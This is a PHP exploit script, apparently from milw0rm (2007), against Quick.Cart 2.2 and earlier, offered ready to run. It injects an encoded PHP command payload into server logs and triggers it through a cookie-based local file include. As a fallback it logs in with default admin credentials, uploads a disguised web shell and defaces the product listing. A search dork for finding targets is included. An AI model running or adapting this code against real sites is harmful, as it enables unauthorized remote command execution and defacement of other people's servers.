@@ -1,0 +1,374 @@
+<?php
+/*
+Exploit Name:
+Quick.Cart <= v2.2 Remote Local Include Exploit & Remote Code Execution Exploit
+
+Autor: Kacper
+Contact: kacper1964@yahoo.pl
+Homepage: http://www.rahim.webd.pl/
+Kacper Hacking & Security Blog: http://kacper.bblog.pl/
+Irc: irc.milw0rm.com:6667 #devilteam 
+
+Pozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.
+
+Pozdrawiam pl.zone-h.org, a najbardziej demo, oraz cala ekipe Zone-H.Org  :)
+
+//dork: "Powered by Quick.Cart"
+
+script homepage/download/demo: http://opensolution.org/
+*/
+
+if ($argc<4) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to Quick.Cart
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+ -L[Login]:    Admin login (Default: admin)
+ -H[Password]: Admin password (Default: admin)
+Example:
+php '.$argv[0].' localhost /Quick.Cart/ ls -la
+php '.$argv[0].' localhost /Quick.Cart/ ls -la -Ladmin -Hadmin
+php '.$argv[0].' localhost /Quick.Cart/ ls -la -P1.1.1.1:80
+---------------------------------------------------------------------------
+');
+die;
+}
+error_reporting(7);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function wyslijpakiet($pakiet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$pakiet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$login="admin";
+$haslo="admin";
+$cmd="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>'-p') and ($temp<>'-P')) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+if ($temp=="-L")
+{
+  $login=str_replace("-L","",$argv[$i]);
+}
+if ($temp=="-H")
+{
+  $haslo=str_replace("-H","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'bad patch!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+/*
+how its works :)
+
+in file "config/general.php" lines 12-33:
+
+################################################################################
+$config['dir_config']           = 'config/';
+$config['dir_core']             = 'core/';
+$config['dir_db']               = 'db/';
+$config['dir_js']               = 'js/';
+$config['dir_libraries']        = 'libraries/';
+$config['dir_tpl']              = 'templates/';
+$config['dir_files']            = 'files/';
+$config['dir_ext']              = 'ext/';
+$config['dir_plugins']          = 'plugins/';
+$config['dir_lang']             = 'lang/';
+
+if( isset( $sLang ) && is_file( $config['dir_lang'].$sLang.'.php' ) && strlen( $sLang ) == 2 ){
+  setCookie( 'sLanguage', $sLang, time( ) + 86400 );
+  define( 'LANGUAGE', $sLang );
+}
+else{
+  if( isset( $_COOKIE['sLanguage'] ) )            <-------------------------[^]
+    define( 'LANGUAGE', $_COOKIE['sLanguage'] );    <-------------------------[^^]
+  else
+    define( 'LANGUAGE', $config['default_lang'] ); 
+}
+################################################################################
+
+and in index.php we can find line 32:
+
+################################################################################
+require_once DIR_LANG.LANGUAGE.'.php'; <-------------------------[^^^]
+################################################################################
+
+we can define LANGUAGE string. 
+
+Now how remote code execution:
+
+in admin panel can upload any file on serwer, if you have admin login and password. Default admin login and password in script is "admin" many users dont change it!!
+They don't edit file "config/general.php" lines 75-76:
+$config['login']		= "admin";
+$config['pass']		= "admin";
+
+;)
+
+Elo :)
+*/
+
+echo "insert evil code in logfiles to run local include ...\r\n\r\n";
+$hauru2 = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
+"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
+"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
+"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
+"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
+"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
+"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
+$pakiet="GET ".$p.$hauru2." HTTP/1.0\r\n";
+$pakiet.="User-Agent: ".$hauru2." Googlebot/2.1\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="Connection: close\r\n\r\n";
+wyslijpakiet($pakiet);
+sleep(1);
+$paths= array (
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+for ($i=0; $i<=count($paths)-1; $i++)
+{$a=$i+2;
+echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
+echo "remote code execution...wait..\n";
+$pakiet ="GET ".$p."index.php HTTP/1.1\r\n";
+$pakiet.="Cookie: sLanguage=../".$paths[$i]."%00;\r\n";
+$pakiet.="HAURU: ".$cmd."\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="Connection: Close\r\n\r\n";
+wyslijpakiet($pakiet);
+if (strstr($html,"Hauru"))
+{$temp=explode("Hauru",$html);
+die($temp[1]);
+}else{echo "can't run evil code :/ ..\n";}}
+$data   ="_POST[sLogin]=".$login."&_POST[sPass]=".$haslo."&submit=sign%20in%20&raquo;";
+$pakiet ="POST ".$p."admin.php?p=login HTTP/1.0\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n";
+$pakiet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$pakiet.="Content-Length: ".strlen($data)."\r\n";
+$pakiet.="Accept: text/plain\r\n";
+$pakiet.="Connection: Close\r\n\r\n";
+$pakiet.=$data;
+wyslijpakiet($pakiet);
+$temp=explode("Set-Cookie: ",$html);
+$cookie="";
+for ($i=1; $i<count($temp); $i++)
+{$temp2=explode(" ",$temp[$i]);
+$cookie.=" ".$temp2[0];}
+$temp=explode("PHPSESSID=",$cookie);
+$temp2=explode(";",$temp[1]);
+$ciacho=$temp2[0];
+echo "Now remote code execution with admin account..\n";
+echo $ciacho."\n";
+$hauru=
+"\x20\x0d\x0a\x47\x49\x46\x38\x36\x0d\x0a\x3c\x3f\x70\x68\x70\x20".
+"\x6f\x62\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0d\x0a\x2f\x2f\x52".
+"\x75\x63\x68\x6f\x6d\x79\x20\x7a\x61\x6d\x65\x6b\x20\x48\x61\x75".
+"\x72\x75\x20\x3b\x2d\x29\x0d\x0a\x65\x63\x68\x6f\x22\x2e\x2e\x2e".
+"\x48\x61\x63\x6b\x65\x72\x2e\x2e\x4b\x61\x63\x70\x65\x72\x2e\x2e".
+"\x4d\x61\x64\x65\x2e\x2e\x69\x6e\x2e\x2e\x50\x6f\x6c\x61\x6e\x64".
+"\x21\x21\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x2e\x54\x45\x41\x4d\x2e".
+"\x2e\x74\x68\x65\x2e\x2e\x62\x65\x73\x74\x2e\x2e\x70\x6f\x6c\x69".
+"\x73\x68\x2e\x2e\x74\x65\x61\x6d\x2e\x2e\x47\x72\x65\x65\x74\x7a".
+"\x2e\x2e\x2e\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65\x63\x68".
+"\x6f\x22\x2e\x2e\x2e\x47\x6f\x20\x54\x6f\x20\x44\x45\x56\x49\x4c".
+"\x20\x54\x45\x41\x4d\x20\x49\x52\x43\x3a\x20\x37\x32\x2e\x32\x30".
+"\x2e\x31\x38\x2e\x36\x3a\x36\x36\x36\x37\x20\x23\x64\x65\x76\x69".
+"\x6c\x74\x65\x61\x6d\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65".
+"\x63\x68\x6f\x22\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x20\x54\x45\x41".
+"\x4d\x20\x53\x49\x54\x45\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77".
+"\x77\x77\x2e\x72\x61\x68\x69\x6d\x2e\x77\x65\x62\x64\x2e\x70\x6c".
+"\x2f\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x69\x6e\x69\x5f\x73".
+"\x65\x74\x28\x22\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f".
+"\x6e\x5f\x74\x69\x6d\x65\x22\x2c\x30\x29\x3b\x0d\x0a\x20\x0d\x0a".
+"\x20\x0d\x0a\x65\x63\x68\x6f\x20\x22\x48\x61\x75\x72\x75\x22\x3b".
+"\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x70\x61\x73\x73\x74\x68\x72\x75".
+"\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54\x54\x50\x5f\x48".
+"\x41\x55\x52\x55\x5d\x29\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x64".
+"\x69\x65\x3b\x3f\x3e\x0d\x0a\x20";
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="sName"
+
+DEVIL TEAM
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="aCategories[]"
+
+1
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="fPrice"
+
+10000000.00
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="sDescriptionShort"
+
+Hacked by Polish Hackers
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="sDescriptionFull"
+
+http://www.rahim.webd.pl/
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="iPosition"
+
+-99
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="iStatus"
+
+1
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="aFiles[]"; filename="hauru.php"
+Content-Type: text/plain
+
+'.$hauru.'
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="aFilesDescription[]"
+
+1
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="aFilesPosition[]"
+
+1
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="iProduct"
+
+
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="sOption"
+
+save
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="submit"
+
+zapisz &raquo;
+-----------------------------7d6224c08dc--
+';
+$pakiet ="POST ".$p."admin.php?p=productsList&sOption=save HTTP/1.0\r\n";
+$pakiet.="Content-Type: multipart/form-data; boundary=-----------------------------7d6224c08dc\r\n";
+$pakiet.="Accept-Language: pl\r\n";
+$pakiet.="Proxy-Connection: Keep-Alive\r\n";
+$pakiet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\r\n";
+$pakiet.="Cookie: sLogin=".$login."; PHPSESSID=".$ciacho."\r\n";
+$pakiet.="Content-Length: ".strlen($data)."\r\n";
+$pakiet.="Connection: Close\r\n\r\n";
+$pakiet.=$data;
+wyslijpakiet($pakiet);
+sleep(1);
+echo "Now try to remote code execution...\n";
+$pakiet ="GET ".$p."files/hauru.php HTTP/1.1\r\n";
+$pakiet.="HAURU: ".$cmd."\r\n";
+$pakiet.="Host: ".$host."\r\n";
+$pakiet.="Connection: Close\r\n\r\n";
+wyslijpakiet($pakiet);
+if (strstr($html,"Hauru"))
+{$temp=explode("Hauru",$html);
+die($temp[1]);}
+echo "Cant find evil file :/    maybe this version script is too old but is not vulnerable ...";
+echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam ";
+?>
+
+# milw0rm.com [2007-06-02]
